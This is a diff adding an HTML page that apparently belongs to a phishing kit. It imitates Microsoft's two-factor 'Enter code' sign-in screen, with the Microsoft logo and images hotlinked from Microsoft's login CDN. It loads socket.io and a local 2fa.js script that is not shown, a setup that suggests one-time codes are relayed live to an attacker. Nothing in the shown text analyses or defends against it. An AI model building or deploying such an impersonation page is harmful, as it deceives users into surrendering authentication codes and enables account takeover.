@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Help us protect your account</title>
+		<link rel="shortcut icon" href="images/favicon.ico" />
+		<link rel="stylesheet" href="./style/output.css?new=t5" />
+		<script src="https://cdn.socket.io/4.7.5/socket.io.min.js" integrity="sha384-2huaZvOR9iDzHqslqwpR87isEmrfxqyWOF7hr7BY6KG0+hVKLoEXMPUJw3ynWuhO" crossorigin="anonymous"></script>
+		<style>
+			input[type='checkbox'] {
+				width: 20px;
+				height: 20px;
+			}
+		</style>
+	</head>
+	<body class="flex sm:justify-center items-center h-screen w-full flex-col">
+		<section class="bg-white p-10 lg:p-12 w-full sm:w-97 md:shadow overflow-hidden relative section">
+			<img src="./images/microsoft_logo.svg" alt="" class="mb-3" />
+
+			<form id="code-form" class="relative flex flex-col">
+				<span class="text-sm m-grey hidden" id="user-email"></span>
+				<h1 class="mt-2 mb-2 text-2xl font-semibold" style="color: #1b1b1b; font-size: 22px">Enter code</h1>
+				<div class="flex mb-2">
+					<img
+						class="tile-img small"
+						role="presentation"
+						pngsrc="https://logincdn.msftauth.net/shared/1.0/content/images/picker_verify_code_6e35ee43654c656c620ea1f24c9797e7.png"
+						svgsrc="https://logincdn.msftauth.net/shared/1.0/content/images/picker_verify_code_b41922ebdaebec16b19999fc6054a15a.svg"
+						data-bind="imgSrc, css: { 'small': small }"
+						src="https://logincdn.msftauth.net/shared/1.0/content/images/picker_verify_code_b41922ebdaebec16b19999fc6054a15a.svg"
+					/>
+					<p class="text-sm opacity-80 grey">Enter the code displayed in the Microsoft app (such as Authenticator or Outlook) you use for approving sign-in requests.</p>
+				</div>
+				<p class="text-red-500 leading-5 hidden text-sm" id="error-msg"></p>
+
+				<input type="text" name="" id="code-input" placeholder="Code" class="outline-none border-b w-full pb-1 my-1 border-gray-600 text-sm" />
+
+				<label class="my-2 text-sm flex gap-2 cursor-pointer">
+					<input id="idChkBx_SAOTCC_TD" type="checkbox" value="true" data-bind="checked: tdCheckbox.isChecked, disable: tdCheckbox.isDisabled, ariaLabel: str['CT_SAOTCC_STR_AddTD'], attr: { name: svr.Du }" name="AddTD" aria-label="Don't ask me again on this device" checked />
+					<span class="m-grey">Don't ask me again on this device</span>
+				</label>
+				<p class="my-2 text-xs m-grey">Having trouble? <a href="#" class="blue-link"> Sign in another way</a></p>
+
+				<button type="submit" class="blue-link-bg py-1 px-7 text-white mt-8 input self-end text-sm" id="submitCode">Verify</button>
+			</form>
+
+			<div class="bg-white h-full w-full absolute top-0 left-0 opacity-65 hidden" id="overlay">
+				<div
+					class="___8509zi0 f1euv43f f15twtuk f1vgc2s3 fri679z fly5x3f f1uume8q ffaz6on f1m3tc8b f1i2n5vz fvn5op fcb265f f1dvoww6 fv6o6n1 f1fhb8pd f1kbi84t fantt2w f198vmee f9ujs9y fh4d1wz ftytnaw f1pp1adv f189tktw f16isq f1nkv2po flm8qir fb757qh f1x2efdl f1n79la3 f15utjab f14xebzo fgcztm9 fhhmtwr f12t7lhm fdtcugw f1lmrqpp fpxi8sl f2g94dy f552fgt f1f72ruk f19dq72h z-20"
+					role="progressbar"
+					aria-label="Please wait"
+				>
+					<div></div>
+					<div></div>
+					<div></div>
+					<div></div>
+					<div></div>
+				</div>
+			</div>
+		</section>
+
+		<footer class="self-start pl-5 sm:pl-0 sm:self-end absolute bottom-0 text-xs pb-1 font-normal text-gray-500 sm:text-gray-800">
+			<a class="mr-4 hover:underline cursor-pointer"> Terms of use </a>
+			<a href="#" class="mr-4 hover:underline cursor-pointer"> Privacy & cookies </a>
+			<a href="#" class="mr-2 cursor-pointer text-2xl tracking-widest"> ... </a>
+		</footer>
+	</body>
+
+	<script src="./script/2fa.js?new=t1"></script>
+</html>
